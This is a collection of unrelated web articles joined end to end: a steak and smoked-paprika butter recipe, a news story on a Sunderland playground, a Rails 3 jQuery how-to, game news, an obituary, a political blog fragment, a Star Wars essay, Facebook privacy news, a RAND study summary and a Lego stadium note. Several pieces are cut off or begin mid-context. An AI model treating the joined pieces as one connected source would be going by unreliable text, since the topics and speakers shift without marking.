So last night , in honor of my return to the grill , I opted for something fancy .
And by fancy I do n’t mean complicated , I mean expensive .
It ’s nice to splurge once in a while and the thick beef tenderloin steaks at the market looked so good that I could n’t resist .
Although I love a good porterhouse or rib eye , there ’s nothing like biting into a perfectly grilled tenderloin steak .
Usually I do n’t do much to these steaks … a little olive oil , salt , and pepper and they taste amazing .
But occasionally I wrap them in bacon .
Last night I took it a step further and crowned my effort with a slice of spicy , smoky compound butter .
I was inspired to make this butter a few days ago after visiting 101 Cookbooks .
I love smoked paprika and I ’m always looking for new ways to use it .
It tastes amazing in this butter and I can’t believe I did n’t think of it sooner !
By the way , if you like to make your own barbecue rubs and you have never tried smoked paprika … go buy some now !
Yes , a steak wrapped in bacon and covered in butter might sound like a heart attack waiting to happen , but beef tenderloin is very lean and we ’re only talking about one slice of bacon and maybe a teaspoon of butter .
Adding a dab of compound butter to grilled meat takes it to a whole new level .
Try some sage butter on a grilled pork chop if you do n’t believe me .
Bacon - Wrapped Beef Medallions
4 beef tenderloin steaks , 1 1/2 inches thick
4 slices bacon
olive oil
kosher salt
freshly ground pepper
1 . Take steaks out of fridge and let sit at room temperature for 20 - 30 minutes .
While steaks are coming to room temperature , get your grill ready ( gas or charcoal ) .
2 . Rinse steaks and pat dry with paper towels .
Tightly wrap one slice of bacon around each steak , securing with with a toothpick .
Brush a thin layer of olive oil on each side of the steaks and season both sides with kosher salt and fresh ground pepper .
3 . Place steaks over a direct medium - hot flame and cook for 4 - 5 minutes on each side .
Move steaks to indirect heat , reduce grill temperature to medium , and continue cooking until the interior temperature reaches 145 degres for medium rare ( medium 160 , well - done 170 ) .
4. Remove steaks to a platter , top each steak with a slice of Spicy Smoked Paprika Butter ( if using ) and resist the urge to cut into them for at least 10 minutes !!
It is important to let ANY meat rest for 10 minutes after it comes off the grill so that the juices can redistribute throughout the meat .
If you cut it right away , all the juices will run right out .
Spicy Smoked Paprika Butter
1 stick unsalted butter ( 1/2 cup ) at room temperature
1 T. smoked sweet paprika
1 t. chili powder
1/4 t. chipotle chili powder ( or substitute with cayenne pepper )
1/2 t. powdered cumin
1/2 t. garlic powder
salt to taste
1 . In a small bowl , mix all ingredients into butter until well combined .
Add salt to taste and mix well .
2. Spoon mixture onto a sheet of waxed paper , roll it into a cylinder and twist each end tight .
Refrigerate overnight or place the wrapped butter in a freezer bag and freeze until ready to use .
Recipe notes :
The butter will keep in the freezer for 6 months .
When ready to use , defrost in the fridge to make it easier to slice .
Make sure you visit 101 Cookbooks to check out some other ideas for making and using compound butters .

What , no swings ?
Families ' fury after council spends £ 70,000 on ' deathtrap playground which looks like a cemetery '
They were promised a sparkling £ 70,000 playground - and were expecting the traditional children 's climbing frames and swings .
But what they got looks more like a military cemetery , with one resident branding the minimalist play area a ' deathtrap ' .
Sunderland Council has described the blocks as ' play features ' at Diamond Hall Pocket Park in Millfield .
But local parents have had a hard time explaining the purpose of the seemingly random blocks to their disappointed children .
Minimal fun : Diamond Hall Pocket Park , in Millfield , features concrete block ' play features ' , but local children have found little enjoyment from them
And they claim they had been sent a leaflet showing images of a climbing frame and swings - a far cry from what was eventually delivered .
The park has been given a makeover with money from the £ 2.5 million Play Pathfinder funding , which was awarded to Wearside .
Jackie Nisula , 46 , a full - time carer , has lived in Millfield for 15 years .
She said : ' I think it 's a shambles and a death trap .
I 've seen kids of six or seven climbing on the poles - can you imagine what would happen if they fell off them .
' There 's things that look like miniature gravestones sticking out of the ground .
They put lots of holes in the ground with photographs , covered by glass , but they were all smashed after one day .
' There 's no seating area to watch your kids .
It does n't seem to be child friendly at all .
When my son was little , he used to play when they had swings - he loved it .
He 's 21 now and has a son of his own , and he can't take him there .
' It 's just not safe for little kids to go on .
The stepping stones are really high and made out of concrete .
Kids want to jump over them but they could easily crack their heads open .
' It just does n't seem to have been made with kids in mind .
It 's a half - hearted job .
They promised us that it would all be different but they spent all that money and it 's worse than before . '
Slammed : parents have criticised ' miniature gravestones ' , bleak design and the fact that there is no obvious seating from which parents can watch their children
Joanne Nunn , 26 , from Millfield , mother to four - year - old Luke , said : ' I thought that the idea for a new park was brilliant .
We expected swings , roundabouts and slides .
' It 's terrible .
I saw somebody working on the park the other day and I asked why the park was like that .
They said it was a " non traditional park for the modern child " , and it was supposed to encourage kids to use their imagination .
I could n't believe it . '
' Some kids who are older might enjoy it , but it does n't look fun .
There 's nothing for the younger children .
My boy is four , I would n't let him near it .
There 's too much concrete - he could hurt himself and there is nothing fun for him to do .
' I would have loved to see a lot more done with the money . '
Mother - of - one Saacha Thompson , 34 , said she had a hard time explaining to her three - year - old daughter Imogen that the park was finished .
The East Coast Trains worker said : ' When they said they had £ 2.5 million for all the parks in Sunderland I think we were expecting something really good .
The one at Silksworth is brilliant .
But it looks like they spent about £ 200 on the one in Millfield . '
Parents say the leaflet sent to their homes , showing a girl on a climbing frame and children on swings , was misleading .
Single mother - of - two Adele Hopper , 24 , said : ' I was surprised to find out the park was finished .
It did n't look finished .
I thought they would put stuff on top of the concrete blocks .
But now I 've got used to it and I like the park . '
The council 's head of community services , Julie Gray , said : ' Local children in the community have been involved from the start in helping to create the park and play area on the site of the former Diamond Hall primary school .
' The design of the park was the result of extensive public consultation , with the local community and councillors asked to give their views at a number of events on the layout of the park and what kind of equipment they would like to see installed .
' This design also includes a CCTV camera being installed to help maintain a safe and secure playing environment . '
HOWTO : Unobtrusive JavaScript with Rails 3
This post is by Rizwan Reza .
See footer for more info .
One of the big surprises and accomplishments is the fact that Unobtrusive Javascript made it into Rails 3 .
At first , we thought UJS was n’t going to be included in Rails 3 .
Well , just before the first beta came out , the community responded well and a bunch of enthusiastic developers finished up one of the most wanted feature in Rails 3 .
Rails has always been about staying on the cutting edge and Rails 3 is no surprise , UJS implementation in Rails 3 takes benefit of the new HTML5 data -* @ attributes .
So Rails does n’t spit out Prototype - based Javascript inline ( the old helpers are still here ) .
Rather , the helpers just define an appropriate data attribute in the tag , and that ’s where Javascript comes in .
This literally means you can pick the data attributes in any Javascript framework and write generic code to support Ajax implementation of any kind .
As you can imagine , this can be a highly flexible approach for demanding applications .
But there ’s more , the generic Prototype implementation is included with Rails 3 and the jQuery version is maintained officially here .
Let ’s see how easy it is to swap jQuery in Rails 3 .
In the root of a Rails 3 application , run :
curl -L http://code.jquery.com/jquery-1.4.2.min.js > public / javascripts/jquery.js curl - L http://github.com/rails/jquery-ujs/raw/master/src/rails.js > public / javascripts/rails.js
Here ’s an initializer I got to know from Yehuda that you can define in config / initializers so javascript_include_tag : defaults uses jQuery instead of Prototype .
module ActionView : : Helpers :: AssetTagHelper remove_const :JAVASCRIPT_DEFAULT_SOURCES
JAVASCRIPT_DEFAULT_SOURCES
= %w( jquery.js rails.js ) reset_javascript_include_default
end
With that set , Rails is now unaware of Prototype , all of the helpers with : remote => true will be grabbed by rails.js and worked through jQuery .
You might also want to remove the Prototype libraries inside public / javascripts if you ’re not going to use them .
As you can see , UJS in Rails 3 is pretty easy .
Though there is a bit of a configuration to be done if you ’re going against the default option in Rails , it ’s far easier to work with than in the previous versions .
You should also look at the fantastic Rails 3 Release Notes for changes in the concerned helpers and the section on Unobtrusive Javascript in my article on RailsDispatch .

EA ’s press conference for this year ’s E3 just finished … and as expected it finished with a smashing The Old Republic cinematic trailer .
I Just wanted to put together a quick post that details the things we ’ve discovered today , the day BEFORE E3 officially begins !
Player Ships !
IGN UK revealed through their play with the Smuggler that each class will get their own ship , and it will be highly customizeable .
Though they did n’t go into more detail than that I suspect ( as I have for a long time ) that ships will function much the same as your ship did in the first two KotOR games … a place where your companions hang out , from where you can travel to other planets , and perhaps for things like crafting .
Now , they do n’t say anything about space combat but if the ships are highlyg customiseable , that ’s likely to mean other people will be able to see them … 🙂
War Zones !
These seem to be The Old Republic ’s implementation of PvP battlegrounds .
According to Joystiq , one of them will be on Alderaan .
I did n’t really get more details beyond that .
Just that you ’re supposedly have to pick a side ; Republic or Empire .
Who would ’ve thought that ?
The new cinematic trailer – “ Hope ” – has been revealed !
I ’ve blogged about the leaked trailer before , but now it is official .
SWTOR.com has been updated with the trailer …
A high - rez version has been posted for download as well !
Oh , one final thing , they also confirmed that people will be able to get hands - on experience with the game during E3 , so I ’m sure that we ’ll get plenty of reports on that in the coming days .
Possibly even some gameplay videos .
Born in New York , she was mostly educated in Europe - her father was a diplomat whose great uncle was the art historian Bernard Berenson .
Berry inherited her father 's gift for languages .
Her ambivalent career was partly a product of these aristocratic antecedents and connections .
Through her better - known sister , the actress Marisa ( Death In Venice , Cabaret and Barry Lyndon ) , she came to photograph a roll - call of Hollywood stars : Tuesday Weld , Ray Brock , Pilar Crespi , Candice Bergen and more .
The sisters were raised as socialites who entertained , and were entertained by , both the cream and the froth of society .
One of this charmed circle , Diana Vreeland , the legendary editor - in - chief of Vogue magazine - and sometime fashion editor of Harper 's Bazaar - set her up as a fashion photographer .
She began to work for both magazines .
Without ever straying too far outside the conventions of the medium , she enjoyed " playing " with her models - several of whom she knew anyway - in setting up a shot .
This career path brought the sisters together to create Dressing Up , for which Berry took the portraits and Marisa provided the text - and modelled some of the outfits .
Her most recent publication was a working biography of the couturier , Halston .
In 1973 , she married the actor Tony Perkins .
She was three months pregnant , a condition that prompted her mother , the impressively titled Marquesa Gogo Berenson di Cacciapooti , to call her a " degenerate " .
Despite Perkins 's homosexuality , Berry remained his wife , and cared for him in the last two years of his life .
During their marriage , she had carved out an alternative career path as an actor .
In between cover shoots for Life magazine , she was shooting films .
Particularly after 1978 , when both her sons were well beyond babyhood , she played major or minor roles in such films as Remember My Name ( 1978 ) ; Winter Kills ( 1979 ) , a political melodrama with a cast that included Perkins , John Huston and Elizabeth Taylor ; Cat People ( 1982 ) , a horror mystery ; and in the 1980 TV series , Scruples .
Many of these roles had a sinister undertow .
In Alan Rudolph 's Remember My Name , for example , Perkins and Berenson co-starred as a suburban couple whose lives gradually come apart following an apparently random act of vandalism .
While Perkins summed up his personal tragedy , après Flaubert , with : " Face it gang , I am Norman Bates , " Berry Berenson has been given a very different memorial .
In the wake of the horror of her death , her spokeswoman Susan Patricola commented : " She was one of the loveliest , greatest people on the earth , full of life . "
At the time of her death , Berenson was returning home to Los Angeles after holidaying on Cape Cod .
She is survived by her two sons by Anthony Perkins : Osgood , aged 27 , and Elvis Perkins , aged 25 .
Ronald Bergan writes : During therapy , for what he believed would " cure " his homosexuality , Anthony Perkins was asked what sort of woman attracted him .
He flipped through a copy of Vogue until he pointed to a spread on Berry Berenson .
Coincidentally , Berenson claimed : " When I was 12 , I fell in love with Anthony Perkins in Phaedra . "
Ten years later , in 1972 , Berry visited her screen idol at the New York townhouse he shared with the dancer Grover Dale , for Andy Warhol 's magazine , Interview .
" I thought she was cute and pretty but a little frantic , " Perkins recalled .
Soon after , they started to go out together .
In 1973 , She and Tony got married .
An ex-boyfriend of Perkins , photographer Chris Markos , said : " The funny thing is that Berry and I looked similar - we both had short fair hair and similar features .
This was noticed by the Andy Warhol crowd , who joked that he substituted Berry for me . "
However , there is no doubt that Perkins was both sexually attracted to and in love with Berenson .
There was also agreement among their circle of friends that she either did not know about his sexual adventures before and after their marriage , or that she preferred not to know , or , in fact , care .
Then , in 1990 , Perkins was tested positive for HIV .
He decided that he wanted the knowledge kept secret even from their intimates , which heaped a tremendous burden on Berenson .
When Perkins got Aids , she finally decided to tell a few of their closest friends - " to share this grief with us " .
On September 2 1992 , Perkins died with Berenson clutching her husband 's hand .
" We had a very satisfying life together .
It was a wonderful love affair .
If anything else was happening , I certainly did n't know about it , and I do n't think he intended to hurt me in any way . "

Last month we noted that Star Parker had announced that she was running for Congress .
A longtime right - wing activist , Parker was a regular participant at events like the Values Voter Debate and the annual FRC Values Voter Summit :
When she is not delivering fiery speeches at right - wing conference , Parker has been busy suing the White House over its efforts to rebut misinformation regarding health care reform and warning that marriage equality in Washington DC would lead to the spread of HIV and was akin to thinking “ that serving up another glass of wine is the way to help a drunk ” all while declaring that “ it should concern every American as we watch our nation ’s capital city transform officially into Sodom . ”
Well , apparently Sarah Palin has decided that this is just the sort of person we need in Congress :

Star Wars episodes one through three are not about watching out for the dark lords among us .
They are about watching out for those who say they will protect us .
It is about a corrupt Jedi Council fighting a corrupt Senate .
The citizens are caught between out - of - control overlords and people that want to be out - of - control overlords .
Star Wars was n’t just about the corruption of Anakin Skywalker .
It was about the corruption of the Jedi Council and the Jedi knights .
In the penultimate battle between Obi-Wan Kenobi and Anakin Skywalker , Kenobi taunts Skywalker with “ only a Sith deals in absolutes … ” but then he goes on to say that “ The Sith are evil ! ”
Most reviewers point out the hypocrisy in the second part of that : Obi-Wan Kenobi is dealing in absolutes !
But the real error of the Jedi is in the first part .
The Sith excel in shades of gray .
They deliberately see justifications for evil where no justification should be allowed .
The Jedi deal in absolutes — or , they should .
The Sith do not deal in absolutes .
They are continually trying to shade what should be absolutes into grays .
They try to justify their evil .
The Jedi code , what we know of it , says that some things are good , and some things are evil .
The Jedi code says to “ never give in to the dark side . ”
The Sith say that if there is a greater good , the dark side is justified ; it provides the power to do good in a wayward world .
The Jedi code would not allow killing the children of their enemies , but the Sith will do so in defense of the greater good of ensuring that the Jedi cannot corrupt the world in a never - ending cycle .
The Jedi code would say that you must bring defeated enemies to trial ; a Jedi will not summarily execute a prisoner .
The Sith will say that some prisoners are too powerful to trust to the justice system .
The Jedi code says that you will act only in defense .
Only the Sith would become generals and lead armies against worlds that just want to be left alone …
When General Obi-Wan Kenobi tells
Anakin that he must start looking at the world in shades of gray , Kenobi is desperately trying to tell himself that his own actions , despite all that the Jedi code teaches , are good .
He does n’t see that Anakin ’s entire problem is that he is beginning to see the world in shades of gray ; that he is weighing one evil , using the dark side , against another evil : letting someone he loves die .
Not dealing in absolutes is what makes the Sith the evil they are .
And it is what makes the Jedi the danger they have become .
The Jedi Knights , including the council , have already fallen to the dark side .
They no longer deal in the absolutes of Good and Evil , but in expediencies .
Good and evil have become relative .
They take sides in the Senate .
They execute Senators who are too evil to bring to trial .
They lead armies into battle against worlds that just want to separate from the current government .
Given what the current government is about to become , who can blame those worlds ?
The Jedi see only shades of gray , and justify their actions with the hope that an increasingly despotic unity is better than separatism , and that going to war against the separatists is justified as a lesser evil .
That killing a senator will save the senate .
The situation has become so bad that those with misgivings yearn for a savior .
But the situation is also so bad that anyone with potential as a savior is rejected by the rest of the Jedi .
What if the Jedi dealt in absolutes ?
The lesson of Star Wars is that there is Good and Evil , and that justifying corruption in the name of a greater good will fail .
If the Jedi had continued to deal in absolutes , Mace Windu would not have tried to kill Senator Palpatine .
He would have brought the defeated Sith Lord to trial .
And if he had not tried to kill Palpatine , Anakin Skywalker would not have attacked Windu .
When Skywalker tried to stop the summary execution of a freely - elected Republican Senator , he was doing the right thing .
But his killing of a fellow Jedi committed him to a course of action that aligned himself with the Sith .
If the corrupted Jedi teachings did n’t allow for occasional summary executions , Anakin Skywalker might not have executed Count Dooku .
It would have been that much harder for Palpatine to corrupt Skywalker .
If the Jedi dealt in absolutes , the Jedi Council would not have antagonized Anakin Skywalker and Skywalker would never have been seduced by the arguments of the Sith .
The lesson of Star Wars is that there are absolute goods in the world , and there are absolute evils .
We must never forget some actions cannot be justified with a greater good .
We must also not forget that freedom from tyranny is an ultimate good .
This is what the rebels were fighting for towards the end of the series , and this is what the Jedi were trying to stop .
Facebook has introduced its newly overhauled privacy controls , and most critics should be pleased this time around .
The company noted during a press conference Thursday that the site today is very different from how it was when it first started in 2004 , admitting that the privacy controls had grown into something of a Frankenstein monster as the company kept adding on features .
Thanks to feedback from users , CEO Mark Zuckerberg said , Facebook has completely revamped its offerings and has begun slowly rolling out the change to users .
One thing Facebook has made clear is that the privacy changes apply to all content retroactively as well as new products going forward .
There 's now one control ( found by going to the Account menu and then Privacy Settings ) that allows users to make all of their content — photos , contact info , wall postings , etc. — available to only friends , friends of friends , or everyone .
If users want to customize those settings on a more granular basis , they can , but that 's no longer required if users want to just make one click and be done with it .
Facebook has also added a separate page for controlling your directory information — essentially letting you decide how easy or hard you want to make it for other Facebook users to find you .
Through this page , you can control who can search for you on the site based on the three aforementioned tiers ( friends , friends of friends , or everyone ) .
The same will apply to who can send you friend requests , who can send you messages , who can see your friend list , who can see your current city and hometown , and so on .
Here , there are certain settings that are not set to the highest privacy setting by default — at a press conference announcing the changes , Zuckerberg said the company thinks it 's important for all Facebook users to be able to perform a search for all other Facebook users , because how else will your friends find you ?
However , users who choose to hide from the world are welcome to do so .
Finally , Facebook has made it much easier for users to opt out of its " Platform , " which is what third - party apps and websites use to connect to information on your profile .
If you choose to turn it off , all applications will be off and any data they may have collected from your profile will be deleted .
Facebook has also changed the information screen displayed when you add new apps — no longer does it simply state that you 're handing over all your information to a third party .
Instead , the app will show you exactly what information it wants to use from your profile , allowing you to have a better understanding of what you 're handing over when you add new apps to your account .
As a veteran Facebook user , I can say that the new settings seem simplified while at the same time allowing granular control if I want it .
When I have counseled friends and family on how to change their settings in the past , I have had to walk them through a complex process , and the one - ( or two - ) click process for most profile settings will be a very welcome change for many users .
The Center for Democracy & Technology and the American Civil Liberties Union of California both seemed to agree .
" Despite all rumors to the contrary , privacy is not dead , it is on its way to a comeback in the form of simplified controls and better policies , " CDT President Leslie Harris said in a statement .
" After months of privacy - failing moves , Facebook is finally friending privacy again , " ACLU Technology and Civil Liberties Policy Director Nicole Ozer said .
" We hope that Facebook will learn from this recent round of privacy problems and going forward , will keep its principles and not just its pocketbook in mind . "
Zuckerberg told the press that the company has learned a serious lesson in recent months .
" Do n't mess with the privacy stuff for a long time ! " he exclaimed .
Zuckerberg also said that the company listened to feedback from lawmakers , privacy groups , and users themselves as it worked on the changes .
Facebook has also updated the privacy guide on its site and plans to roll out a message at the top of users ' home pages in order to communicate the changes .
A first - of - its - kind study examining the long - term economic consequences of childhood psychological disorders finds the conditions diminish people 's ability to work and earn as adults , costing $ 2.1 trillion over the lifetimes of all affected Americans .
People who suffer from childhood conditions such as depression and substance abuse are less likely to be married , attain less education and see their income reduced by about 20 percent over their lifetimes , according to findings published online by the journal Social Science & Medicine .
" This study shows childhood psychological disorders can cause significant long - lasting harm and can have far - reaching impact on individuals over their lifetimes , " said James P. Smith , the study 's lead author and corporate chair of economics at RAND , a nonprofit research organization .
" Our findings illustrate what the enormous potential might be of identifying and treating these problems early in life . "
Researchers examined information from a large study that has followed American families for more than 40 years and found evidence that the impact of childhood psychological problems have lasting impact across many measures of economic success .
The study is unique because siblings from the same family were followed in the panel , allowing the researchers to compare one sibling with childhood psychological problems to a brother or sister who did not have such problems .
People who reported having psychological problems during childhood averaged $ 10,400 less income per year when compared to siblings who did not have similar problems .
The lower income was partly a consequence of working an average of seven weeks fewer per year .
If about one in 20 adult Americans experienced these psychological problems during their childhood years ( about the current prevalence ) , the total lifetime economic damages for all those affected would be $ 2.1 trillion .
This estimate does not take into consideration the non-economic costs such has lower quality of life .
Researchers also found that people who reported childhood psychological problems were 11 percentage points less likely to marry than their siblings who did not suffer such problems .
Even when people in the group do marry , the income earned by their spouse is lower than seen among other couples .
People who reported psychological problems during childhood on average reported about half a year less of schooling than those who did not report problems .
The schooling differences were greater among those who reported drug or alcohol problems .
" Not all of the people who have psychological problems during childhood will carry these problems into adulthood , " said Smith .
" But they are 10 to 20 times more likely than others to have these shortfalls during adulthood .
There clearly are large economic costs during adulthood caused by childhood psychological conditions . "
The results in the study are drawn from the Panel Study of Income Dynamics , the largest ongoing study of American families .
The study has periodically collected extensive economic and demographic information on a nationally representative sample of about 35,000 people from 5,000 American families over the past 40 years .
Participants in the project were surveyed in 2007 about their childhood psychological and medical history using a module designed by Smith .
This survey asked whether study participants had any of 14 important physical illnesses before age 17 and whether they had suffered from depression , drug or alcohol abuse , or other psychological conditions when they were young .
Researchers were able to test whether their findings were caused by some type of unmeasured family or neighborhood impacts by examining the life course of siblings where one reported childhood psychological problems and another did not .
Smith and co-author Gillian C. Smith of Washington University School of Medicine in Saint Louis also adjusted their analysis to account for any problems that might have been caused by any childhood physical illnesses .
Thus , these psychological problems were not the result of physical illnesses during the childhood years .
Six percent of the people in the study reported some psychological problem as a child -- consistent with the proportion found among the nation as a whole .
About 4 percent reported having depression , 2 percent reported alcohol or drug abuse and another 2 percent reported other psychological problems .
Some people reported having more than one of the conditions during childhood .
Researchers say the principal cause of the economic shortfalls during adulthood appears to be recurring psychological problems .
Among those with no psychological conditions during childhood , 5.4 percent report having an adult psychological problem .
In contrast , 35.8 percent of those who reported a psychological condition during childhood also report an adult psychological condition -- a seven times higher risk .
People who experienced depression as a child were those most likely to report an adult psychological problem .

The research was supported by a grant from the National Institute on Aging and was conducted through the RAND Labor and Population program .
The program examines issues involving U.S. labor markets , the demographics of families and children , social welfare policy , the social and economic functioning of the elderly , and economic and social change in developing countries .
Das Fritz - Walter - Stadion aus Lego
" on the right for more pics .
Details include absolute gems like a functioning floodlight , one Lego person being used for every fan , the late Honorary Captain Fritz Walter 's seat remaining empty even in the sold - out Lego stadium just as in the real stadium , little speakers that play the songs sung by fans at the Betzenberg ... this is probably the greatest Lego stadium ever constructed .
Of course , the city paid for it as a prestige object .
The whole thing used about a million Lego parts and weighs a ton , with no word on the cost .
